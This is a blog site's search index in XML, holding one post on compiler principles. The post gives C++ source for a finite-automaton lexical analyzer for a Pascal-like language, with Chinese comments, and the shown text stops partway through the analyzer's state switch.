<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Compilation-Principle</title>
    <url>/2023/02/27/Development/Algorithm/Compilation-Principle/</url>
    <content><![CDATA[<h2 id="Lexical-Analysis"><a href="#Lexical-Analysis" class="headerlink" title="Lexical Analysis"></a>Lexical Analysis</h2><p>采用NFA，符合一般思维习惯。</p>
<h3 id="Pascal版本"><a href="#Pascal版本" class="headerlink" title="Pascal版本"></a>Pascal版本</h3><p>高度封装，尽可能用函数代替重复的部分来减少代码的行数。</p>
<p>源码：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idMax 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> keyWordsLen 17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wordsAnalyzer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">char</span> wd;            <span class="comment">// 读取字符</span></span><br><span class="line">        <span class="type">int</span> status;         <span class="comment">// 自动机状态</span></span><br><span class="line">        <span class="type">int</span> len;            <span class="comment">// 缓存长度</span></span><br><span class="line">        <span class="type">int</span> flag;           <span class="comment">// 标记分析器是否正常</span></span><br><span class="line">        <span class="type">int</span> wordsLen;       <span class="comment">// 词元数量</span></span><br><span class="line">        <span class="type">int</span> type;           <span class="comment">// 种别归类: 0-关键字 1-运算符 2-常数 3-界符 4-标识符 5-注释串</span></span><br><span class="line">        <span class="type">int</span> cag;         <span class="comment">// 种别码, 保持为可查表位序+1</span></span><br><span class="line">        <span class="type">int</span> srcLen;     <span class="comment">// 源码长度</span></span><br><span class="line">        <span class="type">int</span> needOF;     <span class="comment">// 是否需要保存至文件</span></span><br><span class="line">        <span class="type">int</span> p;          <span class="comment">// 迭代指针</span></span><br><span class="line">        vector&lt;string&gt; strV;    <span class="comment">// 存储词元</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; typeV;    <span class="comment">// 存储种别码</span></span><br><span class="line">        string words;       <span class="comment">// 缓存</span></span><br><span class="line">        string src;     <span class="comment">// 源码字符串</span></span><br><span class="line">        FILE *oF;    <span class="comment">// 结果保存文件，默认为fiP</span></span><br><span class="line">        string oFP;     <span class="comment">// 保存路径</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 词元编码表</span></span><br><span class="line">        vector&lt;string&gt; wordsTable = &#123;</span><br><span class="line">            <span class="string">&quot;program&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;integer&quot;</span>, <span class="string">&quot;bool&quot;</span>,        <span class="comment">// 0-3</span></span><br><span class="line">            <span class="string">&quot;real&quot;</span>, <span class="string">&quot;char&quot;</span>, <span class="string">&quot;const&quot;</span>, <span class="string">&quot;begin&quot;</span>,           <span class="comment">// 4-7</span></span><br><span class="line">            <span class="string">&quot;if&quot;</span>, <span class="string">&quot;then&quot;</span>, <span class="string">&quot;else&quot;</span>, <span class="string">&quot;while&quot;</span>,              <span class="comment">// 8-11</span></span><br><span class="line">            <span class="string">&quot;do&quot;</span>, <span class="string">&quot;repeat&quot;</span>, <span class="string">&quot;until&quot;</span>, <span class="string">&quot;for&quot;</span>,             <span class="comment">// 12-15</span></span><br><span class="line">            <span class="string">&quot;to&quot;</span>, <span class="string">&quot;non&quot;</span>, <span class="string">&quot;non&quot;</span>, <span class="string">&quot;non&quot;</span>,                  <span class="comment">// 16(17-19跳过)</span></span><br><span class="line">            <span class="string">&quot;!&quot;</span>, <span class="string">&quot;&amp;&amp;&quot;</span>, <span class="string">&quot;||&quot;</span>, <span class="string">&quot;+&quot;</span>,                       <span class="comment">// 20-23</span></span><br><span class="line">            <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&lt;&quot;</span>,                         <span class="comment">// 24-27</span></span><br><span class="line">            <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;=&quot;</span>, <span class="string">&quot;&gt;=&quot;</span>, <span class="string">&quot;=&quot;</span>,                       <span class="comment">// 28-31</span></span><br><span class="line">            <span class="string">&quot;:=&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;intConst&quot;</span>, <span class="string">&quot;realConst&quot;</span>,        <span class="comment">// 32-35</span></span><br><span class="line">            <span class="string">&quot;strConst&quot;</span>, <span class="string">&quot;boolConst&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>,          <span class="comment">// 36-39</span></span><br><span class="line">            <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;//&quot;</span>, <span class="string">&quot;/*&quot;</span>,                      <span class="comment">// 40-43</span></span><br><span class="line">            <span class="string">&quot;*/&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>,                        <span class="comment">// 44-47</span></span><br><span class="line">            <span class="string">&quot;.&quot;</span>,                                        <span class="comment">// 48</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 空白字符</span></span><br><span class="line">        vector&lt;<span class="type">char</span>&gt; filt = &#123;<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">        <span class="comment">// 单字分隔符,不考虑冒号,点号</span></span><br><span class="line">        vector&lt;<span class="type">char</span>&gt; delm = &#123;<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>&#125;;</span><br><span class="line">        <span class="comment">// 布尔常量</span></span><br><span class="line">        vector&lt;string&gt; boolean = &#123;<span class="string">&quot;true&quot;</span>, <span class="string">&quot;false&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">wordsAnalyzer</span>(string fiP = <span class="string">&quot;./test.txt&quot;</span>, string foP = <span class="string">&quot;./res.txt&quot;</span>)&#123;</span><br><span class="line">            flag = <span class="number">1</span>;               <span class="comment">// 分析器状态ok</span></span><br><span class="line">            words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">            status = <span class="number">0</span>;     <span class="comment">// 自动机起点</span></span><br><span class="line">            wordsLen = <span class="number">0</span>;   <span class="comment">// 词元数量</span></span><br><span class="line">            oFP = foP;      <span class="comment">// 保存路径</span></span><br><span class="line">            p = <span class="number">0</span>;          <span class="comment">// 指针初始化为0</span></span><br><span class="line">            ifstream ins;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(oFP!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                needOF = <span class="number">1</span>;</span><br><span class="line">                oF = <span class="built_in">fopen</span>(oFP.<span class="built_in">c_str</span>(), <span class="string">&quot;w&quot;</span>);    <span class="comment">// 覆盖式的写入</span></span><br><span class="line">                <span class="keyword">if</span>(oF==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Fail to write in the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">                    <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newPrintf</span>(<span class="string">&quot;Output file path: %s -&gt; Succeed!\n&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> needOF = <span class="number">0</span>;    <span class="comment">// 不保存文件</span></span><br><span class="line">            ins.<span class="built_in">open</span>(fiP, ios::in);     <span class="comment">// 读入模式打开文件</span></span><br><span class="line">            <span class="keyword">if</span>(!ins.<span class="built_in">good</span>())&#123;    <span class="comment">// 检测文件是否正常打开</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Fail to open the file: %s&quot;</span>, fiP.<span class="built_in">c_str</span>());</span><br><span class="line">                <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);       <span class="comment">// 出错, 终止程序</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Input file path: %s -&gt; Succeed!\n&quot;</span>, fiP.<span class="built_in">c_str</span>());   <span class="comment">// 展示读取路径</span></span><br><span class="line">            <span class="built_in">printSplit</span>(<span class="string">&quot;Src&quot;</span>);  <span class="comment">// 分割线</span></span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> _ch;</span><br><span class="line">            src = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((_ch = ins.<span class="built_in">get</span>()) != EOF)&#123;    <span class="comment">// 存入源码串中</span></span><br><span class="line">                src += _ch;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ins.<span class="built_in">close</span>();</span><br><span class="line">            src += <span class="string">&#x27;\0&#x27;</span>;    <span class="comment">// 终止符</span></span><br><span class="line">            srcLen = src.<span class="built_in">length</span>();  <span class="comment">// 源码串长度</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;%s\n&quot;</span>, src.<span class="built_in">c_str</span>());    <span class="comment">// 展示源码</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ~<span class="built_in">wordsAnalyzer</span>()&#123;</span><br><span class="line">            <span class="built_in">fclose</span>(oF);     <span class="comment">// 关闭FILE文件流</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">analyze</span><span class="params">()</span></span>&#123;    <span class="comment">// 词法分析器</span></span><br><span class="line">            <span class="keyword">while</span>(p &lt; srcLen)&#123;</span><br><span class="line">                wd = src[p];</span><br><span class="line">                <span class="keyword">switch</span>(status)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 自动机起点，words为空</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isBlank</span>()) <span class="built_in">blankContinue</span>();   <span class="comment">// 跳过空白字符, 并迭代指针</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);   <span class="comment">// 转移状态-&gt;1 字母开头 大写字母可以用于区分标识符和关键字，但即使全是小写字母也需要单独检查，因此全是字母归为一类</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>)) <span class="built_in">newStatus</span>(<span class="number">2</span>);                          <span class="comment">// 转移状态-&gt;2 非零数字开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">3</span>);                            <span class="comment">// 转移状态-&gt;3  0开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">4</span>);                                 <span class="comment">// 转移状态-&gt;4</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">5</span>);         <span class="comment">// 转移状态-&gt;5</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">6</span>);         <span class="comment">// 转移状态-&gt;6</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">7</span>);         <span class="comment">// 转移状态-&gt;7</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&lt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">8</span>);         <span class="comment">// 转移状态-&gt;8</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">9</span>);         <span class="comment">// 转移状态-&gt;9</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">10</span>);        <span class="comment">// 状态转移-&gt;10 单字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">11</span>);        <span class="comment">// 状态转移-&gt;11 单字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;!&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">12</span>);        <span class="comment">// 状态转移-&gt;12 单字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">13</span>);         <span class="comment">// 状态转移-&gt;13 加减号(正负号)</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">14</span>);        <span class="comment">// 状态转移-&gt;14 考虑.5 == 0.5 ,此时.后必须有数字</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>())&#123;        <span class="comment">// 单字分界符直接给出结果</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeDelimiter</span>();</span><br><span class="line">                            <span class="built_in">output</span>();               <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;\&#x27;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">15</span>);      <span class="comment">// 状态转移-&gt;15 单引号</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&quot;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">16</span>);       <span class="comment">// 状态转移-&gt;16 双引号</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">passError</span>();      <span class="comment">// 检测到非法字符如&quot;^#$&quot;等</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span>:&#123;    <span class="comment">// 字母开头,全字母情况 可终止 -&gt; 标识符或关键字或布尔常量</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);    <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || wd == <span class="string">&#x27;_&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">17</span>);         <span class="comment">// 状态转移-&gt;17</span></span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 处理缓存内容</span></span><br><span class="line">                            <span class="built_in">typeWords</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">2</span>:&#123;        <span class="comment">// 非零数字开头，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd==<span class="string">&#x27;.&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">18</span>);    <span class="comment">// 转移状态-&gt;18 十进制实数, 此时.后可以无内容</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">19</span>);    <span class="comment">// 转移状态-&gt;19 科学计数法E</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>()) <span class="built_in">newStatus</span>(<span class="number">2</span>);      <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            <span class="built_in">passError</span>();   <span class="comment">// 出错处理</span></span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数，重置缓存</span></span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">0</span>);   <span class="comment">// 整常数-&gt;0</span></span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">3</span>:&#123;    <span class="comment">// 0开头数字，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;X&#x27;</span> || wd == <span class="string">&#x27;x&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">20</span>);           <span class="comment">// 状态转移-&gt;20 十六进制X</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;b&#x27;</span> || wd == <span class="string">&#x27;B&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">21</span>);      <span class="comment">// 状态转移-&gt;21 二进制数b</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>)) <span class="built_in">newStatus</span>(<span class="number">22</span>);                 <span class="comment">// 状态转移-&gt;22 八进制数</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            <span class="built_in">passError</span>();   <span class="comment">// 出错处理</span></span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数0</span></span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">0</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">4</span>:&#123;    <span class="comment">// 检查 &amp; 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>)&#123;  <span class="comment">// 与运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="built_in">passError</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">5</span>:&#123;    <span class="comment">// 检查 | 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>)&#123;  <span class="comment">// 或运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="built_in">passError</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">6</span>:&#123;    <span class="comment">// 检查 : 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// 赋值号:=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span>&#123;    <span class="comment">// 冒号:</span></span><br><span class="line">                            <span class="built_in">typeDelimiter</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">7</span>:&#123;    <span class="comment">// 检查 &gt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &gt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// &gt;</span></span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">8</span>:&#123;    <span class="comment">// 检查 &lt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &lt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// &lt;</span></span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">9</span>:&#123;    <span class="comment">// 检查 / 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">23</span>);    <span class="comment">// 状态转移-&gt;23 单行注释符//</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">24</span>);   <span class="comment">// 状态转移-&gt;24 多行注释符</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// 除号/</span></span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">10</span>:&#123;   <span class="comment">// 检查 * 这样的语法是允许的：3*-5*+5 可终止</span></span><br><span class="line">                        <span class="comment">// if(wd == &#x27;&amp;&#x27; || wd == &#x27;|&#x27; || &#x27;*&#x27; || &#x27;/&#x27; || &#x27;&lt;&#x27; || &#x27;&gt;&#x27; || &#x27;=&#x27; || &#x27;;&#x27; || &#x27;,&#x27; || &#x27;\&#x27;&#x27; || &#x27;&quot;&#x27; || &#x27;:&#x27;)&#123;</span></span><br><span class="line">                        <span class="comment">//     i = passError(i);</span></span><br><span class="line">                        <span class="comment">// &#125; else &#123;</span></span><br><span class="line">                        <span class="comment">//     type = 1;</span></span><br><span class="line">                        <span class="comment">//     output();</span></span><br><span class="line">                        <span class="comment">//     i -= 1;</span></span><br><span class="line">                        <span class="comment">// &#125;</span></span><br><span class="line">                        <span class="built_in">typeOperator</span>();</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">11</span>:&#123;   <span class="comment">// 检查 =  a = /*2333333*/ 5;</span></span><br><span class="line">                        <span class="comment">// if(wd == &#x27;=&#x27; || &#x27;&amp;&#x27; || &#x27;|&#x27; || &#x27;*&#x27; || &#x27;&lt;&#x27; || &#x27;&gt;&#x27; || &#x27;:&#x27; || &#x27;;&#x27; || &#x27;,&#x27;)&#123;</span></span><br><span class="line">                        <span class="comment">//     i = passError(i);</span></span><br><span class="line">                        <span class="comment">// &#125; else &#123;</span></span><br><span class="line">                        <span class="comment">//     type = 1;</span></span><br><span class="line">                        <span class="comment">//     output();</span></span><br><span class="line">                        <span class="comment">//     i -= 1;</span></span><br><span class="line">                        <span class="comment">// &#125;</span></span><br><span class="line">                        <span class="built_in">typeOperator</span>();</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">12</span>:&#123;   <span class="comment">// 检查 ! 先不谈!=, 这样的语法是可以的 !-.5 == !(-0.5) == 0(boolean) 或者 !!&quot;0&quot; == 1(boolean) 可终止</span></span><br><span class="line">                        <span class="comment">// if(wd == &#x27;&amp;&#x27; || wd == &#x27;|&#x27; || wd == &#x27;*&#x27; || wd == &#x27;&lt;&#x27; || wd == &#x27;&gt;&#x27; || wd == &#x27;:&#x27; || wd == &#x27;;&#x27; || wd == &#x27;,&#x27;)</span></span><br><span class="line">                        <span class="built_in">typeOperator</span>();</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">13</span>:&#123;   <span class="comment">// +-号 不完美的DFA 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(cag &gt;= <span class="number">34</span> &amp;&amp; cag &lt;= <span class="number">38</span> || cag == <span class="number">48</span>)&#123;     <span class="comment">// 前面出现操作数则为加减号, &#x27;(&#x27;被视为有效界符, &#x27;)&#x27; 则被视为操作数</span></span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">14</span>);       <span class="comment">// 状态转移-&gt;14 实数</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>)) <span class="built_in">newStatus</span>(<span class="number">2</span>);      <span class="comment">// 状态转移-&gt;2 非0数字</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">3</span>);        <span class="comment">// 状态转移-&gt;3 数字0</span></span><br><span class="line">                        <span class="keyword">else</span>&#123;   <span class="comment">// 加减号</span></span><br><span class="line">                            <span class="built_in">typeOperator</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">14</span>:&#123;   <span class="comment">// . 实数 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>()) <span class="built_in">newStatus</span>(<span class="number">18</span>);   <span class="comment">// 状态转移-&gt;18 正常实数</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="built_in">typeDelimiter</span>();</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">15</span>:&#123;   <span class="comment">// 单引号 条件终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;\&#x27;&#x27;</span>)&#123;     <span class="comment">// 字符常量</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            <span class="built_in">typeConst</span>(<span class="number">2</span>);</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="built_in">newStatus</span>(<span class="number">15</span>);       <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span 